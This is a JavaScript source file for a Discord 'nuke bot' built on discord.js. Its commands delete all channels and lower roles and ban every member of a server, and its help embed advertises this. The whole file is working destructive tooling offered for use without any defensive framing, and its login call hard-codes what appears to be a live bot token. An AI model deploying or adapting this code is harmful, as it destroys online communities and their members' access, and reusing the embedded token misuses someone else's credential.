const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by INFINITY.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `n!help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nuke Bot | Dev : INFINITT H4X"));
}
if(msg.content.toLowerCase().startsWith("n!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("Nuke Bot | Dev : INFINITT H4X"));
}
if(msg.content.toLowerCase().startsWith("n!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "INFINITY H4X" },
            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact INFINITY H4X"
        }
    })
}
});

nuke.login("NjcxOTkxMDc1NDQyOTE3Mzc2.XjE_-Q.mfVHAbXoeK7KGwJtGWzNgbi61uM");